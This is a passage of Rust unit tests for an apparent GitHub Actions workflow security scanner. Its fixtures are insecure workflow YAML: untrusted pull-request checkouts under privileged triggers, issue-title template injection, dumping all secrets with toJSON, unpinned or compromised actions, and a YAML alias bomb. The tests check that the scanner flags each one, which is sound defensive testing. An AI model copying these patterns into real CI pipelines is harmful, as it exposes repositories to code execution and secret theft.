            "on: pull_request_target\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {SHA_PIN}\n"
        );
        assert!(ids(&base_only).is_empty());
    }

    #[test]
    fn pwn_request_variants() {
        let via_env = format!(
            "on: pull_request_target\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    env:\n      PR_REF: ${{{{ github.event.pull_request.head.ref }}}}\n    steps:\n      - uses: {SHA_PIN}\n        with:\n          ref: ${{{{ env.PR_REF }}}}\n"
        );
        assert_eq!(lines(&via_env), vec![("gha/untrusted-checkout".into(), 11)]);
        let gh_cli = "on: issue_comment\npermissions: {}\njobs:\n  a:\n    if: github.event.comment.author_association == 'MEMBER'\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          gh pr checkout ${{ github.event.issue.number }}\n          make test\n";
        assert_eq!(lines(gh_cli), vec![("gha/untrusted-checkout".into(), 9)]);
        let fetch = "on: pull_request_target\npermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: git fetch origin pull/${{ github.event.number }}/head:pr && git checkout pr\n";
        assert_eq!(ids(fetch), vec!["gha/untrusted-checkout"]);
        assert!(ids(&fetch.replace("pull_request_target", "pull_request")).is_empty());
    }

    #[test]
    fn pinning() {
        let wf = r#"
on: push
permissions: {}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: some-org/deploy-action@main
      - uses: some-org/deploy-action@08eba0b27e820071cde6df949e0beb9ba4906955 # v2.1.0
      - uses: ./.github/actions/local
      - uses: docker://alpine:3.20
      - uses: docker://alpine@sha256:0a4eaa0eecf5f8c050e5bba433f58c052be7587ee8af3e8b3910ef9ab5fbe9f5
      - uses: TJ-Actions/Changed-Files@v45
      - uses: |
          actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: $/.github/workflows/reusable.yml@tag
"#;
        let f = analyze(".github/workflows/x.yml", wf);
        let got: Vec<(&str, Severity, usize)> = f
            .iter()
            .map(|f| (f.rule_id.as_str(), f.severity, f.location.start_line))
            .collect();
        assert_eq!(
            got,
            vec![
                ("gha/unpinned-action", Severity::Info, 8),
                ("gha/unpinned-action", Severity::Medium, 9),
                ("gha/unpinned-action", Severity::Medium, 12),
                ("gha/compromised-action", Severity::High, 14),
            ]
        );
    }

    #[test]
    fn permissions() {
        assert_eq!(
            ids("on: push\npermissions: write-all\njobs: {}\n"),
            vec!["gha/excessive-permissions"]
        );
        let missing = "on: issue_comment\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        assert_eq!(
            lines(missing),
            vec![("gha/excessive-permissions".into(), 3)]
        );
        // A plain push workflow without a permissions block is common and not flagged.
        assert!(ids("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n").is_empty());
        let wide = "on: pull_request_target\npermissions:\n  contents: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: []\n  b:\n    runs-on: ubuntu-latest\n    steps: []\n";
        assert_eq!(lines(wide), vec![("gha/excessive-permissions".into(), 3)]);
        let scoped = wide.replace("    steps: []", "    permissions: {}\n    steps: []");
        assert!(
            ids(&scoped).is_empty(),
            "every job sets its own permissions"
        );
        let single = "on: pull_request_target\npermissions:\n  contents: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: []\n";
        assert!(
            ids(single).is_empty(),
            "one job: workflow level is job level"
        );
    }

    #[test]
    fn comment_triggers_need_an_actor_check_before_using_secrets() {
        let wf = r#"
on: issue_comment
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
"#;
        assert_eq!(ids(wf), vec!["gha/public-trigger-with-secrets"]);
        let guarded = wf.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    if: contains(fromJSON('[\"OWNER\",\"MEMBER\"]'), github.event.comment.author_association)\n",
        );
        assert!(ids(&guarded).is_empty(), "{:?}", ids(&guarded));
        // Mentioning author_association in a script is not a guard.
        let echoed = wf.replace("./deploy.sh", "echo author_association && ./deploy.sh");
        assert_eq!(ids(&echoed), vec!["gha/public-trigger-with-secrets"]);
        // GITHUB_TOKEN is always available; using it is not "reading secrets".
        let token = wf.replace("secrets.DEPLOY_TOKEN", "secrets.GITHUB_TOKEN");
        assert!(ids(&token).is_empty(), "{:?}", ids(&token));
        // The word "secrets" in a script is not a secret; toJSON(secrets) is all of them.
        let prose = wf.replace("${{ secrets.DEPLOY_TOKEN }}", "no secrets here");
        assert!(ids(&prose).is_empty(), "{:?}", ids(&prose));
        let all = wf.replace("secrets.DEPLOY_TOKEN", "toJSON(secrets)");
        assert!(ids(&all).contains(&"gha/public-trigger-with-secrets".to_string()));
    }

    #[test]
    fn secrets_handling_and_self_hosted_runners() {
        let wf = r#"
on: [push, pull_request]
permissions: {}
jobs:
  call:
    uses: other-org/ci/.github/workflows/build.yml@08eba0b27e820071cde6df949e0beb9ba4906955
    secrets: inherit
  local:
    uses: ./.github/workflows/build.yml
    secrets: inherit
  build:
    runs-on: [self-hosted, linux]
    steps:
      - run: echo '${{ toJSON(secrets) }}' > /dev/null
      - run: echo '${{ toJson(secrets) }}' > /tmp/x
"#;
        assert_eq!(
            lines(wf),
            vec![
                ("gha/all-secrets-exposed".into(), 14),
                ("gha/all-secrets-exposed".into(), 15),
                ("gha/secrets-inherit".into(), 7),
                ("gha/self-hosted-runner".into(), 12),
            ]
        );
        // Self-hosted runners on push-only workflows are normal.
        assert!(
            ids(
                "on: push\npermissions: {}\njobs:\n  a:\n    runs-on: self-hosted\n    steps: []\n"
            )
            .is_empty()
        );
    }

    #[test]
    fn aliases_and_numeric_job_names() {
        let wf = "on: issues\npermissions: {}\nx-step: &inject\n  run: echo ${{ github.event.issue.title }}\njobs:\n  1:\n    runs-on: ubuntu-latest\n    steps:\n      - *inject\n  2:\n    runs-on: ubuntu-latest\n    steps:\n      - *inject\n";
        assert_eq!(
            lines(wf),
            vec![("gha/template-injection".into(), 4)],
            "a shared step is reported once, at its definition"
        );
    }

    #[test]
    fn unparsable_workflows_are_reported_not_ignored() {
        assert_eq!(ids("on: [push\njobs: {"), vec!["gha/unanalyzable-workflow"]);
        assert!(ids("just a string").is_empty());
        assert!(ids("").is_empty());
        let mut bomb = String::from("a0: &a0 [x, x, x, x, x, x, x, x, x, x]\n");
        for i in 1..12 {
            let refs = vec![format!("*a{}", i - 1); 10].join(", ");
            bomb.push_str(&format!("a{i}: &a{i} [{refs}]\n"));
        }
        let f = analyze(".github/workflows/x.yml", &bomb);
        assert_eq!(
            (f[0].rule_id.as_str(), f[0].severity),
            ("gha/unanalyzable-workflow", Severity::Medium)
        );
        // A broken file that only happens to be called action.yml is not reported.
        assert!(analyze("docs/action.yml", "a: [").is_empty());
    }

    #[test]
    fn every_rule_is_documented() {
        let src = include_str!("mod.rs");
        for rule in RULES {
            assert!(
                src.matches(rule.id).count() >= 3,
                "{} documented but unused?",
                rule.id
            );
        }
    }
}
